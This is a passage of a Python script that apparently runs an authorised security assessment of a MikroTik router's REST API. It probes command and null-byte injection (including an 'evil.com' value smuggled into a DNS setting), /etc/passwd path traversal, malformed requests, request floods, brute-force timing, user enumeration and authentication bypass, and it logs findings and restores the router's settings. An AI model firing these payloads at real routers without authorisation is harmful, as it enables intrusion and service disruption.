        ("null_byte", "[REDACTED-IP]\x00evil.com"),
    ]
    for name, servers_val in dns_payloads:
        status, resp = rest_post(
            "/ip/dns/set",
            {"servers": servers_val},
        )
        ec.add_test(
            "cmd_injection", f"DNS injection: {name}",
            f"Test command injection via /ip/dns/set servers parameter",
            f"HTTP {status}",
            {"payload_name": name, "servers": servers_val, "status": status,
             "response": str(resp)[:500]},
            anomaly=(status in [200, 201] and name != "normal"),
        )

    # Restore original DNS if we changed it
    if orig_servers:
        rest_post("/ip/dns/set", {"servers": orig_servers})

    # ── 5f: Null byte injection across string fields ─────────────────────────
    null_targets = [
        ("/system/identity/set", {"name": "test\x00inject"}),
        ("/system/script/add", {"name": "_null_test", "source": "echo\x00inject"}),
        ("/ip/address/add", {"address": "[REDACTED-INTERNAL-IP]\x00/24", "interface": "ether1"}),
    ]
    for path, data in null_targets:
        status, resp = rest_post(path, data)
        ec.add_test(
            "cmd_injection", f"Null byte: {path}",
            f"Test null byte injection in string fields on {path}",
            f"HTTP {status}",
            {"path": path, "status": status, "response": str(resp)[:500]},
            anomaly=(status in [200, 201]),
        )
        # Track for cleanup
        if status in [200, 201] and isinstance(resp, dict):
            sid = resp.get("ret") or resp.get(".id")
            if sid:
                if "script" in path:
                    CLEANUP_IDS["scripts"].append(sid)
                elif "address" in path:
                    CLEANUP_IDS["addresses"].append(sid)

    # Restore identity if we changed it
    rest_post("/system/identity/set", {"name": "MikroTik"})


# =============================================================================
# Section 6: Error Handling & Info Disclosure (~30 tests)
# =============================================================================

def test_error_handling():
    """Analyze error responses for information disclosure."""
    log("=" * 60)
    log("Section 6: Error Handling & Information Disclosure")
    log("=" * 60)

    auth = (ADMIN_USER, ADMIN_PASS)

    # ── 6a: Error response analysis ──────────────────────────────────────────
    error_paths = [
        ("/rest/", "REST root with no path"),
        ("/rest/nonexistent", "Non-existent top-level endpoint"),
        ("/rest/system/nonexistent", "Non-existent system sub-endpoint"),
        ("/rest/system/resource/nonexistent", "Non-existent nested path"),
        ("/rest/system/resource/999999", "Non-existent resource ID"),
        ("/nonexistent", "Non-existent path outside /rest/"),
        ("/rest//", "Double slash in path"),
        ("/rest/system/resource/../../../etc/passwd", "Path traversal in error path"),
    ]

    disclosure_keywords = [
        "stack", "trace", "exception", "error at", "line ",
        "/usr/", "/var/", "/etc/", "/home/", "/opt/",
        "internal server error", "debug", "0x", "segfault",
        "memory", "malloc", "free(", "core dump",
    ]

    for path, desc in error_paths:
        status, hdrs, body = raw_request("GET", "", auth=auth)
        # Override — we need to send to the full path
        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                auth=auth, timeout=8, verify=False)
            status = r.status_code
            body = r.text
            hdrs = dict(r.headers)
        except Exception as e:
            status = 0
            body = str(e)
            hdrs = {}

        # Check for info disclosure in error
        disclosures = [kw for kw in disclosure_keywords if kw in body.lower()]
        is_anomaly = len(disclosures) > 0

        ec.add_test(
            "error_handling", f"Error path: {path}",
            desc,
            f"HTTP {status}, disclosures={disclosures}",
            {"path": path, "status": status, "body_preview": body[:1000],
             "headers": hdrs, "disclosures_found": disclosures},
            anomaly=is_anomaly,
        )

        if is_anomaly and any(kw in disclosures for kw in ["stack", "trace", "/usr/", "/var/", "/etc/"]):
            ec.add_finding(
                "LOW",
                f"Information disclosure in error response at {path}",
                f"Error response contains: {', '.join(disclosures)}",
                cwe="CWE-209",
            )

    # ── 6b: Malformed request error analysis ─────────────────────────────────
    malformed_requests = [
        ("empty_post", "POST", "/system/identity/set", b"", {}),
        ("binary_garbage", "POST", "/system/identity/set",
         b"\x00\x01\x02\x03\xff\xfe\xfd", {"Content-Type": "application/json"}),
        ("xml_body", "POST", "/system/identity/set",
         b"<name>test</name>", {"Content-Type": "application/json"}),
        ("very_long_header", "GET", "/system/resource",
         None, {"X-Custom": "A" * 10000}),
        ("many_headers", "GET", "/system/resource",
         None, {f"X-Header-{i}": f"value-{i}" for i in range(100)}),
    ]
    for name, method, path, body, extra_headers in malformed_requests:
        try:
            headers = {"Content-Type": "application/json"}
            headers.update(extra_headers)
            r = requests.request(
                method, f"http://{TARGET}/rest{path}",
                headers=headers,
                data=body,
                auth=auth,
                timeout=8, verify=False,
            )
            resp_body = r.text

            disclosures = [kw for kw in disclosure_keywords if kw in resp_body.lower()]
            ec.add_test(
                "error_handling", f"Malformed request: {name}",
                f"Send malformed {method} request ({name}) to {path}",
                f"HTTP {r.status_code}, disclosures={disclosures}",
                {"name": name, "status": r.status_code,
                 "body_preview": resp_body[:500], "disclosures": disclosures},
                anomaly=len(disclosures) > 0,
            )
        except Exception as e:
            ec.add_test(
                "error_handling", f"Malformed request: {name}",
                f"Send malformed request", f"Error: {e}",
                anomaly=True,
            )

    # ── 6c: Accept header variations ─────────────────────────────────────────
    accept_types = [
        "application/json",
        "text/html",
        "text/xml",
        "application/xml",
        "text/plain",
        "*/*",
        "application/octet-stream",
        "invalid/type",
    ]
    for accept in accept_types:
        try:
            r = requests.get(
                f"http://{TARGET}/rest/system/resource",
                auth=auth,
                headers={"Accept": accept},
                timeout=8, verify=False)
            content_type = r.headers.get("Content-Type", "")
            ec.add_test(
                "error_handling", f"Accept: {accept}",
                f"GET /system/resource with Accept: {accept}",
                f"HTTP {r.status_code}, Content-Type: {content_type}",
                {"accept": accept, "status": r.status_code,
                 "response_content_type": content_type,
                 "body_preview": r.text[:300]},
                anomaly=False,
            )
        except Exception as e:
            ec.add_test(
                "error_handling", f"Accept: {accept}",
                f"Test Accept header", f"Error: {e}",
            )

    # ── 6d: Error response format consistency ────────────────────────────────
    # Compare error format across different error types
    error_scenarios = [
        ("404", "GET", "/nonexistent_endpoint_xyz"),
        ("401_noauth", "GET_NOAUTH", "/system/resource"),
        ("400_bad_json", "POST", "/system/identity/set"),
        ("405_wrong_method", "DELETE", "/system/resource"),
    ]
    error_formats = {}
    for name, method, path in error_scenarios:
        try:
            if method == "GET_NOAUTH":
                r = requests.get(
                    f"http://{TARGET}/rest{path}",
                    timeout=8, verify=False)
            elif method == "POST":
                r = requests.post(
                    f"http://{TARGET}/rest{path}",
                    auth=auth,
                    headers={"Content-Type": "application/json"},
                    data="NOT JSON",
                    timeout=8, verify=False)
            else:
                r = requests.request(
                    method, f"http://{TARGET}/rest{path}",
                    auth=auth, timeout=8, verify=False)

            error_formats[name] = {
                "status": r.status_code,
                "content_type": r.headers.get("Content-Type", ""),
                "body_preview": r.text[:300],
            }
            ec.add_test(
                "error_handling", f"Error format: {name}",
                f"Analyze error response format for {name} scenario",
                f"HTTP {r.status_code}, CT={r.headers.get('Content-Type', '')}",
                error_formats[name],
                anomaly=False,
            )
        except Exception as e:
            ec.add_test(
                "error_handling", f"Error format: {name}",
                f"Error format analysis", f"Error: {e}",
            )


# =============================================================================
# Section 7: Rate Limiting & Resource Exhaustion (~15 tests)
# =============================================================================

def test_rate_limiting():
    """Test rate limiting and resource exhaustion on REST API."""
    log("=" * 60)
    log("Section 7: Rate Limiting & Resource Exhaustion")
    log("=" * 60)

    auth = (ADMIN_USER, ADMIN_PASS)

    # ── 7a: Baseline health ──────────────────────────────────────────────────
    baseline = check_router_alive()
    ec.add_test(
        "rate_limiting", "Pre-test baseline health",
        "Record router health before rate limiting tests",
        f"CPU={baseline.get('cpu_load')}, Mem={baseline.get('free_memory')}",
        {"health": baseline},
        anomaly=False,
    )

    # ── 7b: Rapid sequential requests ────────────────────────────────────────
    rapid_counts = [100]
    for count in rapid_counts:
        times = []
        errors = 0
        throttled = 0
        for i in range(count):
            start = time.time()
            try:
                r = requests.get(
                    f"http://{TARGET}/rest/system/resource",
                    auth=auth, timeout=5, verify=False)
                elapsed = time.time() - start
                times.append(elapsed)
                if r.status_code == 429:
                    throttled += 1
                elif r.status_code != 200:
                    errors += 1
            except Exception:
                elapsed = time.time() - start
                times.append(elapsed)
                errors += 1

        avg_time = sum(times) / len(times) if times else 0
        min_time = min(times) if times else 0
        max_time = max(times) if times else 0
        p95 = sorted(times)[int(len(times) * 0.95)] if times else 0

        # Check if later requests are slower (throttling)
        first_half_avg = sum(times[:len(times)//2]) / max(len(times)//2, 1)
        second_half_avg = sum(times[len(times)//2:]) / max(len(times)//2, 1)
        slowdown_ratio = second_half_avg / first_half_avg if first_half_avg > 0 else 0

        ec.add_test(
            "rate_limiting", f"Rapid {count} sequential requests",
            f"Send {count} rapid GET requests to /system/resource",
            f"avg={avg_time:.3f}s, p95={p95:.3f}s, errors={errors}, throttled={throttled}, "
            f"slowdown={slowdown_ratio:.2f}x",
            {"count": count, "avg_ms": round(avg_time * 1000, 1),
             "min_ms": round(min_time * 1000, 1),
             "max_ms": round(max_time * 1000, 1),
             "p95_ms": round(p95 * 1000, 1),
             "errors": errors, "throttled_429": throttled,
             "slowdown_ratio": round(slowdown_ratio, 2),
             "first_half_avg_ms": round(first_half_avg * 1000, 1),
             "second_half_avg_ms": round(second_half_avg * 1000, 1)},
            anomaly=(throttled == 0),  # Anomaly if NO rate limiting exists
        )

        if throttled == 0:
            ec.add_finding(
                "LOW",
                "No REST API rate limiting detected",
                f"Sent {count} rapid requests with no 429 responses and no observable throttling. "
                f"Slowdown ratio: {slowdown_ratio:.2f}x",
                cwe="CWE-770",
            )

    # ── 7c: Concurrent connections ───────────────────────────────────────────
    concurrency_levels = [10, 50, 100]
    for level in concurrency_levels:
        results_list = []

        def make_request(idx):
            start = time.time()
            try:
                r = requests.get(
                    f"http://{TARGET}/rest/system/resource",
                    auth=auth, timeout=10, verify=False)
                return {"idx": idx, "status": r.status_code,
                        "time": time.time() - start}
            except Exception as e:
                return {"idx": idx, "status": 0, "time": time.time() - start,
                        "error": str(e)}

        with concurrent.futures.ThreadPoolExecutor(max_workers=level) as executor:
            futures = [executor.submit(make_request, i) for i in range(level)]
            for f in concurrent.futures.as_completed(futures):
                results_list.append(f.result())

        successes = sum(1 for r in results_list if r["status"] == 200)
        errors = sum(1 for r in results_list if r["status"] == 0)
        avg_time = sum(r["time"] for r in results_list) / len(results_list) if results_list else 0

        ec.add_test(
            "rate_limiting", f"Concurrent connections: {level}",
            f"Send {level} simultaneous requests to /system/resource",
            f"successes={successes}, errors={errors}, avg={avg_time:.3f}s",
            {"concurrency": level, "successes": successes, "errors": errors,
             "avg_time_ms": round(avg_time * 1000, 1),
             "sample_results": results_list[:5]},
            anomaly=(errors > level * 0.5),
        )

    # ── 7d: Post-test health ─────────────────────────────────────────────────
    time.sleep(2)  # Brief cooldown
    post_health = check_router_alive()
    ec.add_test(
        "rate_limiting", "Post-test health check",
        "Record router health after rate limiting tests",
        f"CPU={post_health.get('cpu_load')}, Mem={post_health.get('free_memory')}",
        {"health": post_health, "baseline": baseline},
        anomaly=not post_health.get("alive", False),
    )

    # ── 7e: Health comparison ────────────────────────────────────────────────
    if baseline.get("free_memory") and post_health.get("free_memory"):
        try:
            base_mem = int(baseline["free_memory"])
            post_mem = int(post_health["free_memory"])
            mem_drop_pct = ((base_mem - post_mem) / base_mem * 100) if base_mem else 0
            ec.add_test(
                "rate_limiting", "Memory impact assessment",
                "Compare memory before and after rate limiting tests",
                f"Memory change: {mem_drop_pct:.1f}% "
                f"({base_mem} -> {post_mem})",
                {"baseline_mem": base_mem, "post_mem": post_mem,
                 "change_pct": round(mem_drop_pct, 1)},
                anomaly=(mem_drop_pct > 10),
            )
        except (ValueError, TypeError):
            pass


# =============================================================================
# Section 8: Content-Type Handling (~20 tests)
# =============================================================================

def test_content_type():
    """Test how the REST API handles various Content-Type headers."""
    log("=" * 60)
    log("Section 8: Content-Type Handling")
    log("=" * 60)

    auth = (ADMIN_USER, ADMIN_PASS)
    valid_json = '{"name":"MikroTik"}'

    # ── 8a: Content-Type variations with valid JSON body ─────────────────────
    content_types = [
        ("no_content_type", None),
        ("application_json", "application/json"),
        ("text_plain", "text/plain"),
        ("text_xml", "text/xml"),
        ("application_xml", "application/xml"),
        ("form_urlencoded", "application/x-www-form-urlencoded"),
        ("multipart", "multipart/form-data"),
        ("octet_stream", "application/octet-stream"),
        ("json_utf8", "application/json; charset=utf-8"),
        ("json_utf16", "application/json; charset=utf-16"),
        ("json_iso", "application/json; charset=iso-8859-1"),
        ("empty_string", ""),
        ("invalid_type", "invalid/completely-wrong"),
    ]
    for name, ct in content_types:
        headers = {}
        if ct is not None:
            headers["Content-Type"] = ct

        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity/set",
                auth=auth,
                headers=headers,
                data=valid_json.encode("utf-8"),
                timeout=8, verify=False)

            # Check if the JSON was actually parsed and applied
            accepted = (r.status_code in [200, 201])
            ec.add_test(
                "content_type", f"Content-Type: {name}",
                f"POST valid JSON with Content-Type: {ct}",
                f"HTTP {r.status_code} — {'ACCEPTED' if accepted else 'REJECTED'}",
                {"content_type": ct, "status": r.status_code,
                 "response": r.text[:500], "accepted": accepted},
                anomaly=(accepted and ct not in [
                    "application/json", "application/json; charset=utf-8", None
                ]),
            )
        except Exception as e:
            ec.add_test(
                "content_type", f"Content-Type: {name}",
                f"POST with Content-Type: {ct}", f"Error: {e}",
            )

    # ── 8b: Wrong body format with correct Content-Type ──────────────────────
    wrong_body_tests = [
        ("xml_as_json", "application/json", "<identity><name>test</name></identity>"),
        ("form_as_json", "application/json", "name=test&value=123"),
        ("csv_as_json", "application/json", "name,value\ntest,123"),
        ("yaml_as_json", "application/json", "name: test\nvalue: 123"),
        ("raw_text", "application/json", "just plain text"),
        ("html_as_json", "application/json", "<html><body>test</body></html>"),
    ]
    for name, ct, body in wrong_body_tests:
        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity/set",
                auth=auth,
                headers={"Content-Type": ct},
                data=body.encode("utf-8"),
                timeout=8, verify=False)
            ec.add_test(
                "content_type", f"Wrong body: {name}",
                f"POST non-JSON body ({name}) with Content-Type: {ct}",
                f"HTTP {r.status_code}",
                {"name": name, "content_type": ct, "status": r.status_code,
                 "body_sent": body[:100], "response": r.text[:500]},
                anomaly=(r.status_code in [200, 201]),
            )
        except Exception as e:
            ec.add_test(
                "content_type", f"Wrong body: {name}",
                f"Wrong body format test", f"Error: {e}",
            )

    # Restore identity
    rest_post("/system/identity/set", {"name": "MikroTik"})


# =============================================================================
# Section 9: Authentication Bypass Attempts (~30 tests)
# =============================================================================

def test_auth_bypass():
    """Test authentication bypass techniques."""
    log("=" * 60)
    log("Section 9: Authentication Bypass Attempts")
    log("=" * 60)

    # ── 9a: Empty/malformed credentials ──────────────────────────────────────
    cred_tests = [
        ("empty_user", "", ADMIN_PASS),
        ("empty_pass", ADMIN_USER, ""),
        ("both_empty", "", ""),
        ("space_user", " ", ADMIN_PASS),
        ("space_pass", ADMIN_USER, " "),
        ("null_user", "\x00", ADMIN_PASS),
        ("null_pass", ADMIN_USER, "\x00"),
        ("null_in_user", f"{ADMIN_USER}\x00extra", ADMIN_PASS),
        ("null_in_pass", ADMIN_USER, f"{ADMIN_PASS}\x00extra"),
        ("case_upper_user", ADMIN_USER.upper(), ADMIN_PASS),
        ("case_mixed_pass", ADMIN_USER, ADMIN_PASS.swapcase()),
        ("trailing_space_user", f"{ADMIN_USER} ", ADMIN_PASS),
        ("trailing_space_pass", ADMIN_USER, f"{ADMIN_PASS} "),
        ("unicode_user", ADMIN_USER + "\u200b", ADMIN_PASS),  # zero-width space
        ("very_long_user", "A" * 10000, ADMIN_PASS),
        ("very_long_pass", ADMIN_USER, "B" * 10000),
    ]
    for name, user, passwd in cred_tests:
        try:
            r = requests.get(
                f"http://{TARGET}/rest/system/resource",
                auth=(user, passwd),
                timeout=8, verify=False)
            bypassed = (r.status_code == 200)
            ec.add_test(
                "auth_bypass", f"Creds: {name}",
                f"Test auth with {name} credentials",
                f"HTTP {r.status_code} — {'BYPASSED' if bypassed else 'rejected'}",
                {"test_name": name, "status": r.status_code,
                 "bypassed": bypassed},
                anomaly=bypassed and name not in ["case_upper_user"],
                # admin == ADMIN on RouterOS is normal
            )
            if bypassed and name not in ["case_upper_user"]:
                ec.add_finding(
                    "HIGH",
                    f"Authentication bypass via {name}",
                    f"Authenticated as {repr(user)} with password variation '{name}'",
                    cwe="CWE-287",
                )
        except Exception as e:
            ec.add_test(
                "auth_bypass", f"Creds: {name}",
                f"Test auth with {name}", f"Error: {e}",
            )

    # ── 9b: Authorization header formats ─────────────────────────────────────
    import base64
    valid_basic = base64.b64encode(f"{ADMIN_USER}:{ADMIN_PASS}".encode()).decode()

    auth_header_tests = [
        ("bearer_token", {"Authorization": f"Bearer {valid_basic}"}),
        ("digest_fake", {"Authorization": 'Digest username="admin", realm="mikrotik"'}),
        ("api_key", {"X-Api-Key": ADMIN_PASS}),
        ("token_header", {"Authorization": f"Token {ADMIN_PASS}"}),
        ("basic_no_pass", {"Authorization": "Basic " +
                           base64.b64encode(f"{ADMIN_USER}:".encode()).decode()}),
        ("basic_no_user", {"Authorization": "Basic " +
                           base64.b64encode(f":{ADMIN_PASS}".encode()).decode()}),
        ("basic_extra_colon", {"Authorization": "Basic " +
                               base64.b64encode(f"{ADMIN_USER}:{ADMIN_PASS}:extra".encode()).decode()}),
        ("double_basic", {"Authorization": f"Basic {valid_basic}",
                          "X-Authorization": f"Basic {valid_basic}"}),
    ]
    for name, headers in auth_header_tests:
        try:
            r = requests.get(
                f"http://{TARGET}/rest/system/resource",
                headers=headers,
                timeout=8, verify=False)
            bypassed = (r.status_code == 200)
            ec.add_test(
                "auth_bypass", f"Auth header: {name}",
                f"Test authentication with {name} header format",
                f"HTTP {r.status_code} — {'ACCEPTED' if bypassed else 'rejected'}",
                {"test_name": name, "status": r.status_code, "bypassed": bypassed},
                anomaly=(bypassed and name not in ["double_basic"]),
            )
        except Exception as e:
            ec.add_test(
                "auth_bypass", f"Auth header: {name}",
                f"Test auth header format", f"Error: {e}",
            )

    # ── 9c: Cookie-based auth (session hijacking test) ───────────────────────
    # First authenticate normally to get any cookies
    try:
        session = requests.Session()
        r1 = session.get(
            f"http://{TARGET}/rest/system/resource",
            auth=(ADMIN_USER, ADMIN_PASS),
            timeout=8, verify=False)
        cookies = dict(session.cookies)

        if cookies:
            # Try using cookies without Basic auth
            r2 = requests.get(
                f"http://{TARGET}/rest/system/resource",
                cookies=cookies,
                timeout=8, verify=False)
            cookie_auth = (r2.status_code == 200)
            ec.add_test(
                "auth_bypass", "Cookie-only auth",
                "Test if session cookies alone grant access (no Basic Auth header)",
                f"HTTP {r2.status_code} — {'COOKIE AUTH WORKS' if cookie_auth else 'rejected'}",
                {"cookies": cookies, "status": r2.status_code, "cookie_auth": cookie_auth},
                anomaly=cookie_auth,
            )
        else:
            ec.add_test(
                "auth_bypass", "Cookie-only auth",
                "Test if session cookies are set after auth",
                "No cookies set by server — stateless auth",
                {"cookies": cookies},
                anomaly=False,
            )
    except Exception as e:
        ec.add_test(
            "auth_bypass", "Cookie-only auth",
            "Cookie auth test", f"Error: {e}",
        )

    # ── 9d: HTTP vs HTTPS auth ───────────────────────────────────────────────
    for scheme in ["http", "https"]:
        try:
            r = requests.get(
                f"{scheme}://{TARGET}/rest/system/resource",
                auth=(ADMIN_USER, ADMIN_PASS),
                timeout=8, verify=False)
            ec.add_test(
                "auth_bypass", f"Auth over {scheme.upper()}",
                f"Test authentication over {scheme.upper()}",
                f"HTTP {r.status_code}",
                {"scheme": scheme, "status": r.status_code},
                anomaly=False,
            )
        except Exception as e:
            ec.add_test(
                "auth_bypass", f"Auth over {scheme.upper()}",
                f"Auth via {scheme}", f"Error: {e}",
            )

    # ── 9e: Rapid auth attempts (brute force timing) ────────────────────────
    wrong_creds = [
        (ADMIN_USER, f"wrong_{i}") for i in range(10)
    ]
    auth_times = []
    for user, passwd in wrong_creds:
        start = time.time()
        try:
            r = requests.get(
                f"http://{TARGET}/rest/system/resource",
                auth=(user, passwd),
                timeout=8, verify=False)
            elapsed = time.time() - start
            auth_times.append({"user": user, "status": r.status_code,
                               "time_ms": round(elapsed * 1000, 1)})
        except Exception:
            elapsed = time.time() - start
            auth_times.append({"user": user, "status": 0,
                               "time_ms": round(elapsed * 1000, 1)})

    avg_fail_time = sum(t["time_ms"] for t in auth_times) / len(auth_times) if auth_times else 0
    # Check if there's increasing delay (backoff)
    first_half = auth_times[:5]
    second_half = auth_times[5:]
    first_avg = sum(t["time_ms"] for t in first_half) / len(first_half) if first_half else 0
    second_avg = sum(t["time_ms"] for t in second_half) / len(second_half) if second_half else 0
    has_backoff = second_avg > first_avg * 1.5

    ec.add_test(
        "auth_bypass", "Brute force timing analysis",
        "Send 10 rapid failed auth attempts and measure response times",
        f"avg={avg_fail_time:.1f}ms, first5_avg={first_avg:.1f}ms, "
        f"last5_avg={second_avg:.1f}ms, backoff={'YES' if has_backoff else 'NO'}",
        {"attempts": auth_times, "avg_ms": avg_fail_time,
         "first_half_avg_ms": first_avg, "second_half_avg_ms": second_avg,
         "has_backoff": has_backoff},
        anomaly=not has_backoff,
    )

    # ── 9f: Valid user timing oracle ─────────────────────────────────────────
    # Compare timing for valid user + wrong pass vs invalid user + wrong pass
    valid_user_times = []
    invalid_user_times = []

    for _ in range(5):
        # Valid user, wrong password
        start = time.time()
        try:
            requests.get(
                f"http://{TARGET}/rest/system/resource",
                auth=(ADMIN_USER, "wrong_password"),
                timeout=8, verify=False)
        except Exception:
            pass
        valid_user_times.append((time.time() - start) * 1000)

        # Invalid user, wrong password
        start = time.time()
        try:
            requests.get(
                f"http://{TARGET}/rest/system/resource",
                auth=("nonexistent_user_xyz", "wrong_password"),
                timeout=8, verify=False)
        except Exception:
            pass
        invalid_user_times.append((time.time() - start) * 1000)

    valid_avg = sum(valid_user_times) / len(valid_user_times) if valid_user_times else 0
    invalid_avg = sum(invalid_user_times) / len(invalid_user_times) if invalid_user_times else 0
    timing_diff = abs(valid_avg - invalid_avg)

    ec.add_test(
        "auth_bypass", "User enumeration timing oracle",
        "Compare auth response times for valid vs invalid usernames",
        f"valid_user_avg={valid_avg:.1f}ms, invalid_user_avg={invalid_avg:.1f}ms, "
        f"diff={timing_diff:.1f}ms",
        {"valid_user_avg_ms": round(valid_avg, 1),
         "invalid_user_avg_ms": round(invalid_avg, 1),
         "timing_diff_ms": round(timing_diff, 1),
         "valid_user_times": [round(t, 1) for t in valid_user_times],
         "invalid_user_times": [round(t, 1) for t in invalid_user_times]},
        anomaly=(timing_diff > 50),  # >50ms difference suggests oracle
    )

    if timing_diff > 50:
        ec.add_finding(
            "LOW",
            "Authentication timing oracle enables user enumeration",
            f"Valid username auth takes {valid_avg:.1f}ms vs {invalid_avg:.1f}ms "
            f"for invalid username (delta={timing_diff:.1f}ms)",
            cwe="CWE-204",
        )


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"MikroTik REST API Security Assessment — Phase 3")
    log(f"Target: {TARGET}")
    log(f"=" * 60)

    # Pre-flight check
    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    # Record initial router identity (to restore later)
    orig_status, orig_identity = rest_get("/system/identity")
    original_name = "MikroTik"
    if orig_status == 200 and isinstance(orig_identity, dict):
        original_name = orig_identity.get("name", "MikroTik")
        log(f"Original identity: {original_name}")

    try:
        # Run all test sections
        test_endpoint_acl()          # ~60 tests
        test_json_parsing()          # ~50 tests
        test_http_methods()          # ~25 tests
        test_query_injection()       # ~30 tests
        test_command_injection()     # ~40 tests
        test_error_handling()        # ~30 tests
        test_rate_limiting()         # ~15 tests
        test_content_type()          # ~20 tests
        test_auth_bypass()           # ~30 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Always clean up
        log("=" * 60)
        log("Post-test cleanup")
        log("=" * 60)

        cleanup_created_objects()

        # Restore identity
        rest_post("/system/identity/set", {"name": original_name})

        # Final health check
        final_health = check_router_alive()
        log(f"Final health: {final_health}")

        # Save evidence
        ec.save("rest_api_attacks.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
